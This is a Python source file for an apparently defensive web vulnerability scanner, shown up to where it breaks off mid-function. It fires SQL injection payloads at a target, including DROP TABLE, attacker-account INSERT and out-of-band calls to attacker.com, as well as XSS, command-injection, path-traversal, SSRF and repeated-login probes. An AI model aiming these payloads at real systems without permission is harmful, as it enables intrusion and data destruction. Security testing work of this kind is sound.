import requests
from urllib.parse import urlparse, urljoin # For URL manipulation
import time
import json
from bs4 import BeautifulSoup
import re




# Standard headers to mimic a browser, can help avoid simple blocks
COMMON_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}
# Define a common timeout for requests
REQUEST_TIMEOUT = 10
session = requests.Session()
session.headers.update(COMMON_HEADERS)
def check_sql_injection(base_url):
    """Checks for basic SQL Injection vulnerabilities."""
    payloads = [
    # Original payloads
    "'",
    "\"",
    " OR 1=1 --",
    " OR '1'='1",

    # Basic Injection & Comment Variations
    "';--",                      # Simple closing and comment
    "\";--",                     # Double quote closing and comment
    "'; #",                      # Simple closing and hash comment (MySQL)
    "\" --",                     # Double quote and space comment (MySQL)
    "') OR '1'='1--",            # Closing parenthesis and single quote

    # Boolean-Based Blind Injection
    "' AND 1=1--",               # True condition (check for normal response)
    "' AND 1=2--",               # False condition (check for different/no response)
    "') AND 1=1--",              # True condition with parenthesis
    "') AND 1=2--",              # False condition with parenthesis
    "\" AND 1=1--",              # True condition with double quotes
    "\" AND 1=2--",              # False condition with double quotes
    "' OR '1'='1' AND 'a'='a",   # Combination
    "' OR '1'='1' AND 'a'='b",   # Combination (false)

    # Time-Based Blind Injection (Database specific examples)
    # MySQL
    "' AND (SELECT SLEEP(5))--", # Delay for 5 seconds
    "') AND (SELECT SLEEP(5))--",
    "\" AND (SELECT SLEEP(5))--",
    "' OR IF(1=1, SLEEP(5), 0)--", # Conditional delay
    # PostgreSQL
    "' AND pg_sleep(5)--",
    "') AND pg_sleep(5)--",
    "\" AND pg_sleep(5)--",
    "' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    # Microsoft SQL Server
    "'; WAITFOR DELAY '0:0:5'--",
    "\" WAITFOR DELAY '0:0:5'--",
    "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
    # Oracle
    "' AND 1=dbms_pipe.receive_message(('a'),5)--",

    # Error-Based Injection (Database specific examples)
    # MySQL
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x) a)--", # Uses GROUP BY error
    "' AND EXTRACTVALUE(1, CONCAT(0x5c, VERSION()))--", # Uses EXTRACTVALUE error
    # Microsoft SQL Server
    "' AND 1=CAST(@@version AS int)--", # Attempts to cast version string to int
    # PostgreSQL
    "' AND CAST(version() AS int)--", # Attempts to cast version string to int
    # Oracle
    "' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--", # Attempts to resolve hostname from database version (can trigger error or OOB)

    # UNION Based Injection (Requires determining column count and data types)
    # These are illustrative and need adaptation based on the number and types of columns
    "' UNION SELECT 1,2,3--",      # Example with 3 columns
    "' UNION SELECT NULL,NULL,NULL--", # Using NULLs to find column count
    "' UNION SELECT @@version, NULL, NULL--", # Example retrieving version
    "' UNION SELECT table_name, column_name, NULL FROM information_schema.columns--", # Example retrieving schema info (MySQL/PostgreSQL)

    # Stacked Queries (Requires support from the database system and application logic)
    # Only works on systems like MSSQL and PostgreSQL, generally not MySQL or Oracle in single query contexts
    "'; SELECT @@version--",      # Get version
    "'; INSERT INTO users (username, password) VALUES ('attacker', 'password');--", # Insert data
    "'; DROP TABLE users;--",     # Dangerous: Drop table

    # Out-of-Band (OOB) Injection (Requires specific database features and attacker-controlled server)
    # DNS/HTTP interactions triggered by the database
    # MySQL (using LOAD_FILE or XML functions)
    "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT VERSION()), '.attacker.com\\')))--", # Trigger DNS lookup with version
    # Microsoft SQL Server (using xp_cmdshell or other features)
    "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--", # Trigger SMB/DNS request
    # Oracle (using UTL_HTTP, UTL_INADDR, etc.)
    "' AND UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--", # Trigger HTTP request with user

    # Second Order SQL Injection Payloads (Delivered in one request, executed in another)
    # These are less about the payload string itself and more about the injection vector and data flow
    # Example: Injecting a payload into a profile field that is later used in a backend query without sanitization.
    # The payload itself might look like one of the above but is stored first.
    # E.g., injecting " ' OR 1=1;--" into a 'Notes' field that is later queried.

    # Common bypasses and obfuscation
    "'+' OR '1'='1--",         # String concatenation
    "' OR '1'='1'/* comment */", # Using comments for obfuscation
    "' OR '1'='1'{",           # WAF bypass attempt (might work on some older/specific WAFs)
    "'; SELECT CHAR(115,121,115,116,101,109,95,117,115,101,114) --", # Using ASCII/CHAR codes

    # Payloads for identifying database type
    "' AND @@version--",        # MySQL/MSSQL
    "' AND version()--",         # PostgreSQL/MySQL
    "' AND banner--",           # Oracle (from v$version)
    "' AND pg_version()--",      # PostgreSQL

    # Checking for ability to load local files (requires specific privileges and configuration)
    "' UNION SELECT LOAD_FILE('/etc/passwd')--", # Linux based file
    "' UNION SELECT LOAD_FILE('C:\\boot.ini')--", # Windows based file

    # Specific to LIMIT/OFFSET clauses (MySQL/PostgreSQL)
    " LIMIT 1,1--", # Retrieve the second row

    # Specific to ORDER BY clauses
    " ORDER BY 1--", # Check if ORDER BY 1 is valid
    " ORDER BY 9999--", # Check for error to determine column count

    # Injection in other parts of the query (less common but possible)
    # (e.g., table names, column names, WHERE clause operators - requires different syntax)
    # Example: SELECT * FROM users WHERE id = 1 [INJECTION POINT]
    # Payload: OR 1=1
    # Result: SELECT * FROM users WHERE id = 1 OR 1=1

    # Example: SELECT * FROM [INJECTION POINT] WHERE id = 1
    # Payload: users--
    # Result: SELECT * FROM users-- WHERE id = 1

]
    vulnerabilities_found = []
    for payload in payloads:
        # Try injecting in a common parameter name 'id'
        test_url = f"{base_url}?id=1{payload}" 
        # It's better to test forms if available, but this is a generic check
        print(f"[*] Testing for SQL Injection with payload '{payload}': {test_url}")
        try:
            response = requests.get(test_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            # Look for common SQL error messages. This is a basic check.
            error_indicators = ['sql syntax', 'mysql', 'unclosed quotation mark', 'odbc', 'oracle']
            if any(indicator in response.text.lower() for indicator in error_indicators):
                message = f"Possible SQL Injection: Detected with payload '{payload}' on URL query parameter."
                print(f"[+] {message}")
                vulnerabilities_found.append(message)
                # return message # Original code returned on first find, let's collect all for this checker
        except requests.exceptions.RequestException as e:
            print(f"[!] Error during SQL Injection check for {test_url}: {e}")
    return vulnerabilities_found if vulnerabilities_found else None


def check_xss(base_url):
    """Checks for basic reflected XSS vulnerabilities."""
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'\"<testxss>" 
    ]
    vulnerabilities_found = []
    # Try injecting in a common parameter name 'q' or 's' (search)
    query_params_to_test = ['q', 's', 'search', 'query', 'name']

    for param_name in query_params_to_test:
        for payload in payloads:
            test_url = f"{base_url}?{param_name}={payload}"
            print(f"[*] Testing for XSS with payload '{payload}' on param '{param_name}': {test_url}")
            try:
                response = requests.get(test_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT)
                # Check if the payload is reflected in the response. This is a very basic check.
                # More advanced checks would involve headless browsers or more sophisticated parsing.
                if payload in response.text:
                    message = f"Possible Reflected XSS: Payload '{payload}' found in response from {test_url}."
                    print(f"[+] {message}")
                    vulnerabilities_found.append(message)
                    # return message # Collect all
            except requests.exceptions.RequestException as e:
                print(f"[!] Error during XSS check for {test_url}: {e}")
    return vulnerabilities_found if vulnerabilities_found else None

def check_csrf(base_url):
    """Placeholder for CSRF check. Real CSRF detection is complex."""
    # Basic check: Look for forms without anti-CSRF tokens. This is very simplistic.
    # A proper check would involve analyzing form submissions, token validation, SameSite cookies etc.
    print(f"[*] Performing basic CSRF check (presence of forms) on: {base_url}")
    try:
        response = requests.get(base_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT)
        if "<form" in response.text.lower(): # Extremely basic: just checks if forms exist
            # This doesn't mean it's vulnerable, just that there are forms to investigate.
            # A better check would parse forms and look for anti-CSRF tokens.
            # For now, we'll keep it simple and not report unless a more specific check is done.
            # print("[i] Forms found. Manual check for CSRF recommended if no anti-CSRF tokens are used.")
            pass # Not returning anything as this check is too generic to be a "vulnerability"
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during basic CSRF check for {base_url}: {e}")
    return None # This check is too basic to reliably report a vulnerability automatically.

def check_command_injection(base_url):
    """Checks for basic command injection vulnerabilities."""
    payloads = ["; ls", "| ls", "&& ls"] # Payloads for Unix-like systems
    # Common parameters that might be vulnerable
    params_to_test = ['cmd', 'exec', 'command', 'ping_address']
    vulnerabilities_found = []

    for param in params_to_test:
        for payload in payloads:
            # URL-encode the payload part that comes after the parameter value
            # e.g., if base_url is http://host/path and param is cmd, payload is ;ls
            # test_url = http://host/path?cmd=;ls  (requests will handle encoding of ; and ls if needed)
            test_url = f"{base_url}?{param}=test{payload}" # Example: ?cmd=test;ls
            print(f"[*] Testing for Command Injection with payload '{payload}' on param '{param}': {test_url}")
            try:
                response = requests.get(test_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT)
                # Simplistic check: look for output typical of 'ls' command (e.g., common directory names)
                # This is highly dependent on the server OS and command output.
                if 'total' in response.text and ('bin' in response.text or 'usr' in response.text or 'etc' in response.text):
                    message = f"Possible Command Injection: Payload '{payload}' on param '{param}' may have executed (heuristic match)."
                    print(f"[+] {message}")
                    vulnerabilities_found.append(message)
            except requests.exceptions.RequestException as e:
                print(f"[!] Error during Command Injection check for {test_url}: {e}")
    return vulnerabilities_found if vulnerabilities_found else None


def check_file_inclusion(base_url):
    """Checks for LFI/RFI vulnerabilities."""
    # Common LFI payloads
    lfi_payloads = [
        "../../../../etc/passwd",
        "../../../../windows/win.ini"
    ]
    # Common RFI test (less likely to work without specific server misconfigurations)
    # rfi_payload = "http://example.com/malicious_script.txt" 
    
    params_to_test = ['file', 'page', 'include', 'path', 'document']
    vulnerabilities_found = []

    for param in params_to_test:
        for payload in lfi_payloads:
            test_url = f"{base_url}?{param}={payload}"
            print(f"[*] Testing for LFI with payload '{payload}' on param '{param}': {test_url}")
            try:
                response = requests.get(test_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT)
                # Check for content typical of /etc/passwd or win.ini
                if "root:x:0:0" in response.text or "[fonts]" in response.text.lower() or "[extensions]" in response.text.lower():
                    message = f"Possible Local File Inclusion (LFI): Payload '{payload}' on param '{param}' may have revealed sensitive file content."
                    print(f"[+] {message}")
                    vulnerabilities_found.append(message)
            except requests.exceptions.RequestException as e:
                print(f"[!] Error during LFI check for {test_url}: {e}")
    return vulnerabilities_found if vulnerabilities_found else None


def check_insecure_http_methods(base_url):
    """Checks for insecure HTTP methods like PUT, DELETE if OPTIONS reveals them."""
    print(f"[*] Checking for insecure HTTP methods via OPTIONS: {base_url}")
    try:
        response = requests.options(base_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT)
        allowed_methods_str = response.headers.get('Allow', '')
        if allowed_methods_str:
            print(f"[*] Allowed methods reported by OPTIONS: {allowed_methods_str}")
            allowed_methods = [method.strip().upper() for method in allowed_methods_str.split(',')]
            # Define potentially insecure/interesting methods if found enabled on sensitive endpoints
            insecure_methods_to_flag = ['PUT', 'DELETE', 'TRACE', 'CONNECT'] # TRACE and CONNECT are often problematic
            found_insecure = [method for method in insecure_methods_to_flag if method in allowed_methods]
            if found_insecure:
                message = f"Potentially Insecure HTTP Methods Enabled: {', '.join(found_insecure)} (Verify if needed on sensitive resources)."
                print(f"[+] {message}")
                return message
        else:
            print("[i] No 'Allow' header in OPTIONS response, or it was empty.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during insecure HTTP methods check for {base_url}: {e}")
    return None

def check_directory_traversal(base_url):
    """Alias for LFI, as they are often tested similarly with path traversal."""
    # This is largely similar to LFI. You might want to use specific directory traversal payloads
    # that aim for directory listings rather than file content, or combine them.
    print("[*] Running Directory Traversal check (similar to LFI)...")
    return check_file_inclusion(base_url) # Re-uses LFI logic for now

def check_server_info_disclosure(base_url):
    """Checks for Server information disclosure in headers."""
    print(f"[*] Checking for Server information disclosure: {base_url}")
    try:
        response = requests.get(base_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT)
        server_header = response.headers.get('Server')
        x_powered_by_header = response.headers.get('X-Powered-By')
        disclosures = []
        if server_header:
            message_server = f"Server Information Disclosure: 'Server' header is '{server_header}'."
            print(f"[+] {message_server}")
            disclosures.append(message_server)
        if x_powered_by_header:
            message_xpb = f"Technology Information Disclosure: 'X-Powered-By' header is '{x_powered_by_header}'."
            print(f"[+] {message_xpb}")
            disclosures.append(message_xpb)
        
        return disclosures if disclosures else None
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during Server Info Disclosure check for {base_url}: {e}")
    return None

def check_clickjacking(base_url):
    """Checks for Clickjacking vulnerability (missing or misconfigured X-Frame-Options)."""
    print(f"[*] Checking for Clickjacking: {base_url}")
    try:
        response = requests.get(base_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT)
        xfo_header = response.headers.get('X-Frame-Options', '').lower()
        csp_frame_ancestors = response.headers.get('Content-Security-Policy', '')

        if 'frame-ancestors' in csp_frame_ancestors:
            # If CSP frame-ancestors is present, it takes precedence over X-Frame-Options
            if "'none'" in csp_frame_ancestors or "self" in csp_frame_ancestors and not any(host in csp_frame_ancestors for host in ["*", "http:", "https:"]):
                 print("[i] Clickjacking likely mitigated by CSP frame-ancestors directive.")
                 return None # Properly configured
            else:
                message = f"Possible Clickjacking: CSP 'frame-ancestors' present but might be too permissive: '{csp_frame_ancestors}'."
                print(f"[+] {message}")
                return message


        if not xfo_header:
            message = "Possible Clickjacking: 'X-Frame-Options' header is missing."
            print(f"[+] {message}")
            return message
        elif xfo_header not in ['deny', 'sameorigin']:
            # Allow specific whitelisted domains with ALLOW-FROM, but this is less common and complex to verify automatically
            if not xfo_header.startswith('allow-from'):
                message = f"Possible Clickjacking: 'X-Frame-Options' header is present but potentially misconfigured ('{xfo_header}'). Should be 'DENY' or 'SAMEORIGIN'."
                print(f"[+] {message}")
                return message
        print("[i] X-Frame-Options header seems okay or CSP frame-ancestors is used.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during Clickjacking check for {base_url}: {e}")
    return None

def check_ssl_tls(base_url):
    """Checks if HTTPS is used and for basic SSL/TLS issues."""
    print(f"[*] Checking SSL/TLS for: {base_url}")
    parsed_url = urlparse(base_url)
    if parsed_url.scheme != "https":
        message = "Security Advisory: Site is not using HTTPS. Data is transmitted unencrypted."
        print(f"[+] {message}")
        return message
    
    # If it is HTTPS, try to connect and see if any obvious errors occur
    try:
        # verify=True is default, ensures certificate is validated against trust store
        response = requests.get(base_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT)
        if response.ok: # Check for 2xx status codes
             # Further checks (e.g., specific TLS versions, weak ciphers) require more specialized tools or libraries.
            print("[i] HTTPS is in use and connection was successful.")
            # This isn't a vulnerability, but an observation.
            # Could return a message like "HTTPS in use. Advanced TLS/SSL configuration checks (cipher suites, certificate details) require specialized tools."
            return None # No direct vulnerability found by this basic check if HTTPS is fine
    except requests.exceptions.SSLError as e:
        message = f"SSL/TLS Error: Connection to {base_url} failed due to an SSL error (e.g., certificate invalid, handshake failure): {e}"
        print(f"[+] {message}")
        return message
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during SSL/TLS check for {base_url}: {e}")
        return f"Could not verify SSL/TLS for {base_url} due to connection error: {e}"
    return None


def check_open_redirect(base_url):
    """Checks for basic open redirect vulnerabilities."""
    # A common, but not exhaustive, list of redirect parameters
    redirect_params = ['url', 'redirect', 'goto', 'next', 'dest', 'redirect_uri', 'returnTo']
    # Use a known, non-malicious external domain for testing.
    # Using a unique, non-existent domain can also be effective if you check for redirection to it.
    evil_target_domain = "example.com/maliciouspage" # Should be a domain you control or a safe one
    
    vulnerabilities_found = []

    for param in redirect_params:
        # Construct test URL. Ensure the evil target is URL encoded.
        test_redirect_url = f"http://{evil_target_domain}" # Test with http
        # test_url = f"{base_url}?{param}={requests.utils.quote(test_redirect_url)}" # More robust
        test_url = f"{base_url}?{param}={test_redirect_url}"


        print(f"[*] Testing for Open Redirect with param '{param}': {test_url}")
        try:
            # allow_redirects=False is crucial here to inspect the Location header
            response = requests.get(test_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            
            # Check if status code is a redirect (3xx) and Location header points to the evil domain
            if response.status_code in [301, 302, 303, 307, 308]:
                location_header = response.headers.get('Location', '')
                if evil_target_domain in location_header:
                    message = f"Possible Open Redirect: Redirected to '{location_header}' using param '{param}'."
                    print(f"[+] {message}")
                    vulnerabilities_found.append(message)
        except requests.exceptions.RequestException as e:
            print(f"[!] Error during Open Redirect check for {test_url}: {e}")
    
    return vulnerabilities_found if vulnerabilities_found else None

def check_subdomain_takeover(base_url_input):
    """Checks for potential subdomain takeover vulnerabilities (very basic)."""
    parsed_input = urlparse(base_url_input)
    main_domain = parsed_input.netloc # e.g., www.example.com or example.com

    # Extract the root domain (e.g., example.com from www.example.com)
    # This is a simplistic approach; public suffix lists are more robust.
    parts = main_domain.split('.')
    if len(parts) > 2:
        root_domain = '.'.join(parts[-2:]) # Takes last two parts, e.g. example.com
    else:
        root_domain = main_domain # Assumed to be already a root domain

    potential_subdomains_to_check = [
        f"dev.{root_domain}", f"test.{root_domain}", f"staging.{root_domain}",
        f"api.{root_domain}", f"blog.{root_domain}", f"shop.{root_domain}",
        # Add any CNAMEs you might find through other means (e.g. DNS enumeration)
    ]
    # Remove the original input domain if it's in the list to avoid self-check as "takeover"
    potential_subdomains_to_check = [sd for sd in potential_subdomains_to_check if sd != main_domain]


    vulnerabilities_found = []
    print(f"[*] Checking for Subdomain Takeover on variants of: {root_domain}")

    for sub_url_to_test_host in potential_subdomains_to_check:
        sub_url_to_test_scheme = f"http://{sub_url_to_test_host}" # Test with http first
        print(f"[*] Testing subdomain: {sub_url_to_test_scheme}")
        try:
            response = requests.get(sub_url_to_test_scheme, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT, allow_redirects=True)
            # Basic check: 404 is a common indicator.
            # Real checks look for specific error messages from cloud providers (e.g., "NoSuchBucket", "There isn't a GitHub Pages site here.")
            # This is a very simplified check.
            if response.status_code == 404:
                message = f"Possible Subdomain Takeover: {sub_url_to_test_scheme} returned HTTP 404. Investigate CNAME/DNS records."
                print(f"[+] {message}")
                vulnerabilities_found.append(message)
            # Add checks for specific provider messages if possible
            # E.g., if "NoSuchBucket" in response.text: message = "..." ; vulnerabilities_found.append(message)

        except requests.exceptions.ConnectionError:
            # Inability to connect (e.g., DNS NXDOMAIN) can also be an indicator if a CNAME points to a non-existent service.
            message = f"Possible Subdomain Takeover: Could not connect to {sub_url_to_test_scheme} (Connection Error/NXDOMAIN). This might indicate a dangling DNS record."
            print(f"[+] {message}") # This is an informational finding, could be a takeover
            vulnerabilities_found.append(message)
        except requests.exceptions.Timeout:
            print(f"[!] Timeout while checking {sub_url_to_test_scheme}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error checking {sub_url_to_test_scheme}: {e}")
            
    return vulnerabilities_found if vulnerabilities_found else None


def check_csrf(base_url):
    """Performs basic CSRF vulnerability checks by looking for forms without anti-CSRF tokens."""
    print(f"[*] Performing CSRF check on: {base_url}")
    try:
        response = requests.get(base_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        if not forms:
            print("[-] No forms found on page, skipping CSRF check.")
            return None

        vulnerabilities_found = []
        for form in forms:
            inputs = form.find_all('input')
            token_found = any('csrf' in (input.get('name') or '').lower() for input in inputs)
            if not token_found:
                action = form.get('action')
                message = f"Possible CSRF: Form with action '{action}' lacks CSRF token."
                print(f"[+] {message}")
                vulnerabilities_found.append(message)
        return vulnerabilities_found if vulnerabilities_found else None
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during CSRF check for {base_url}: {e}")
        return None

def check_ssrf(base_url):
    """Checks for possible SSRF vulnerabilities by injecting known external addresses."""
    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254",  # AWS metadata
        "http://[::1]",            # IPv6 localhost
        "http://example.com@127.0.0.1",  # Obfuscated
        "http://127.0.0.1:80",
    ]
    parameters_to_test = ['url', 'redirect', 'next', 'data', 'dest', 'image', 'path', 'file']
    vulnerabilities_found = []

    for param in parameters_to_test:
        for payload in payloads:
            test_url = f"{base_url}?{param}={payload}"
            print(f"[*] Testing SSRF with payload '{payload}' on param '{param}': {test_url}")
            try:
                response = requests.get(test_url, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT, allow_redirects=False)
                # Check if request was redirected or has a response typical of internal addresses
                if response.status_code in [200, 302, 403] and "localhost" in response.text.lower():
                    message = f"Possible SSRF: Payload '{payload}' triggered internal interaction on {test_url}."
                    print(f"[+] {message}")
                    vulnerabilities_found.append(message)
            except requests.exceptions.RequestException as e:
                print(f"[!] Error during SSRF check for {test_url}: {e}")
    return vulnerabilities_found if vulnerabilities_found else None

def check_rate_limiting(base_url):
    """Checks for lack of rate limiting by sending repeated login attempts."""
    login_endpoint = f"{base_url}/login"  # Adjust if your login URL is different
    print(f"[*] Testing for rate limiting on: {login_endpoint}")

    vulnerabilities_found = []
    for i in range(10):  # Send multiple login attempts
        data = {'username': 'admin', 'password': f'wrongpassword{i}'}
        print(f"[*] Attempt #{i+1}: Trying login with username=admin and password=wrongpassword{i}")
        try:
            response = requests.post(login_endpoint, data=data, headers=COMMON_HEADERS, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                if "incorrect" in response.text.lower() or "invalid" in response.text.lower():
                    continue  # Login failed as expected
                else:
                    # If we get a success or no blocking message, might indicate a brute-force issue
                    print(f"[!] Unexpected response during brute-force test: {response.text[:100]}")
            elif response.status_code in [429, 403]:
                print("[+] Rate limiting or protection detected.")
                return None
        except requests.exceptions.RequestException as e:
            print(f"[!] Error during rate limiting check: {e}")
            return None
    message = "Possible Brute-force Vulnerability: No rate limiting detected after repeated login attempts."
    print(f"[+] {message}")
    vulnerabilities_found.append(message)
    return vulnerabilities_found


def check_broken_access_control(base_url):
    """
    - Direct access to common admin/user-management paths
    - IDOR via predictable IDs or names
    - Access to “secret” endpoints (e.g. /hidden, /secret)
    """
    print("\n[*] Checking Broken Access Control...")
    admin_paths = [
        '/admin', '/administrator', '/manage', '/dashboard',
        '/admin/login', '/user/manage', '/hidden', '/secret'
    ]
    findings = []

    # 1) Admin & secret paths
    for path in admin_paths:
        url = urljoin(base_url, path)
        print(f"    - Testing access to {url} ...", end="")
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            if r.status_code == 200:
                print(" FOUND")
                findings.append(f"Unprotected admin path: {url} (HTTP 200)")
            else:
                print(" OK")
        except Exception as e:
            print(f" ERROR ({e})")

    # 2) IDOR: numeric, UUID-style, and username guesses
    idor_tests = ['1','2','3','0001','0002','abc','testuser']
    for ident in idor_tests:
        url = f"{base_url}?id={ident}"
        print(f"    - Testing IDOR {url} ...", end="")
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT)
            # heuristic: presence of “profile” or “user” in response & HTTP 200
            if r.status_code == 200 and re.search(r'user[_\-\s]?name|profile', r.text, re.IGNORECASE):
                print(" FOUND")
                findings.append(f"Possible IDOR at {url}")
            else:
                print(" OK")
        except Exception as e:
            print(f" ERROR ({e})")

    return findings


def check_security_misconfiguration(base_url):
    """
    - Exposed .git, .env, backup/config files
    - Directory listing
    - Common default-install panels (phpMyAdmin, Jenkins, etc.)
    """
    print("\n[*] Checking Security Misconfiguration...")
    files = [
        '/.git/HEAD', '/.git/config', '/.env',
        '/config.yml.bak', '/web.config.bak'
    ]
    panels = ['/phpmyadmin', '/pma', '/jenkins', '/setup']
    findings = []

    # exposed files
    for p in files:
        url = urljoin(base_url, p)
        print(f"    - Checking {url} ...", end="")
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200 and len(r.text) > 20:
                print(" FOUND")
                findings.append(f"Exposed file: {url}")
            else:
                print(" OK")
        except Exception as e:
            print(f" ERROR ({e})")

    # directory listing
    dir_url = urljoin(base_url, '/')
    print(f"    - Checking dir listing at {dir_url} ...", end="")
    try:
        r = session.get(dir_url, timeout=REQUEST_TIMEOUT)
        if '<title>Index of' in r.text:
            print(" FOUND")
            findings.append(f"Directory listing enabled at {dir_url}")
        else:
            print(" OK")
    except Exception as e:
        print(f" ERROR ({e})")

    # default panels
    for ep in panels:
        url = urljoin(base_url, ep)
        print(f"    - Checking default panel {url} ...", end="")
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200:
                print(" FOUND")
                findings.append(f"Default panel accessible: {url}")
            else:
                print(" OK")
        except Exception as e:
            print(f" ERROR ({e})")

    return findings


def check_sensitive_data_exposure(base_url):
    """
    - Search common endpoints and headers for tokens, keys, creds.
    """
    print("\n[*] Checking Sensitive Data Exposure...")
    endpoints = ['/', '/robots.txt', '/.gitignore']
    regex = re.compile(
        r'(AKIA[0-9A-Z]{16}|BEGIN PRIVATE KEY|password\s*=\s*["\']).{0,50}',
        re.IGNORECASE
    )
    findings = []

    for ep in endpoints:
        url = urljoin(base_url, ep)
        print(f"    - Scanning {url} ...", end="")
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT)
            body_matches = regex.findall(r.text)
            header_matches = [
                f"{h}: {v}"
                for h, v in r.headers.items()
                if re.search(r'token|secret|key|auth', h, re.IGNORECASE)
            ]
            if body_matches or header_matches:
                print(" FOUND")
                for m in body_matches:
                    findings.append(f"Leaked secret in body @ {ep}: {m[:30]}...")
                for h in header_matches:
                    findings.append(f"Leaked header {h}")
            else:
                print(" OK")
        except Exception as e:
            print(f" ERROR ({e})")

    return findings


def check_cors_misconfiguration(base_url):
    """
    - OPTIONS + GET on sensitive endpoints with ACAO: *
    """
    print("\n[*] Checking CORS Misconfiguration...")
    sensitive = ['/api/user', '/api/account', '/admin', '/settings']
    findings = []

    for p in sensitive:
        url = urljoin(base_url, p)
        print(f"    - OPTIONS {url} ...", end="")
        try:
            r = session.options(url, timeout=REQUEST_TIMEOUT)
            ao = r.headers.get('Access-Control-Allow-Origin')
            if ao == '*':
                print(" FOUND")
                findings.append(f"Wildcard CORS on {p}")
            else:
                print(" OK")
        except Exception as e:
            print(f" ERROR ({e})")

    return findings


def check_unvalidated_redirects(base_url):
    """
    - Test redirect params for open redirect
    """
    print("\n[*] Checking Unvalidated Redirects...")
    params = ['redirect', 'next', 'url', 'returnTo', 'dest']
    evil = "https://evil.example.com/"
    findings = []

    for p in params:
        url = f"{base_url}?{p}={evil}"
        print(f"    - Testing {p} -> {evil} ...", end="")
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            loc = r.headers.get('Location', '')
            if r.status_code in (301,302) and evil in loc:
                print(" FOUND")
                findings.append(f"Open redirect via {p}: {loc}")
            else:
                print(" OK")
        except Exception as e:
            print(f" ERROR ({e})")

    return findings


def check_missing_or_weak_auth(base_url):
    """
    - Try protected endpoints without login
    """
    print("\n[*] Checking Missing/Weak Authentication...")
    protected = ['/profile', '/settings', '/account', '/orders']
    findings = []

    for p in protected:
        url = urljoin(base_url, p)
        print(f"    - Accessing {url} ...", end="")
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            if r.status_code == 200:
                print(" FOUND")
                findings.append(f"Unauthenticated access: {p}")
            else:
                print(" OK")
        except Exception as e:
            print(f" ERROR ({e})")

    return findings


def check_weak_password_policy(base_url):
    """
    - Inspect signup form for password rules
    """
    print("\n[*] Checking Weak Password Policy...")
    signup = urljoin(base_url, '/signup')
    findings = []
    print(f"    - Fetching {signup} ...", end="")
    try:
        r = session.get(signup, timeout=REQUEST_TIMEOUT)
        form = r.text
        # look for hints: minlength, pattern, JS enforcements
        if not re.search(r'minlength\s*=\s*"\d+"', form) \
           and not re.search(r'pattern\s*=\s*"/.+?"/', form) \
           and 'passwordStrength' not in form:
            print(" FOUND")
            findings.append("No password complexity enforced on signup")
        else:
            print(" OK")
    except Exception as e:
        print(f" ERROR ({e})")

    return findings


def check_clickjacking_additional(base_url):
    """
    - Ensure X-Frame-Options or CSP frame-ancestors
    """
    print("\n[*] Checking Clickjacking Headers...")
    print(f"    - GET {base_url} ...", end="")
    resp = session.get(base_url, timeout=REQUEST_TIMEOUT)
    xfo = resp.headers.get('X-Frame-Options', '')
    csp = resp.headers.get('Content-Security-Policy', '')
    findings = []

    if not xfo and 'frame-ancestors' not in csp:
        print(" FOUND")
        findings.append("Missing X-Frame-Options and CSP frame-ancestors")
    else:
        print(" OK")

    return findings


def check_api_endpoint_exposure(base_url):
    """
    - Probe /api/, /v1/, /v2/, /graphql
    """
    print("\n[*] Checking API Endpoint Exposure...")
    apis = ['/api/', '/v1/', '/v2/', '/graphql', '/rest/']
    findings = []
    for a in apis:
        url = urljoin(base_url, a)
        print(f"    - GET {url} ...", end="")
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            if r.status_code == 200:
                print(" FOUND")
                findings.append(f"Unprotected API endpoint: {a}")
            else:
                print(" OK")
        except Exception as e:
            print(f" ERROR ({e})")

    return findings


def check_internal_ips_in_responses(base_url):
    """
    - Scan HTML/JS for private IPv4 & IPv6 literals
    """
    print("\n[*] Checking for Exposed Internal IPs...")
    findings = []
    url = base_url  # only root page
    print(f"    - GET {url} ...", end="")
    try:
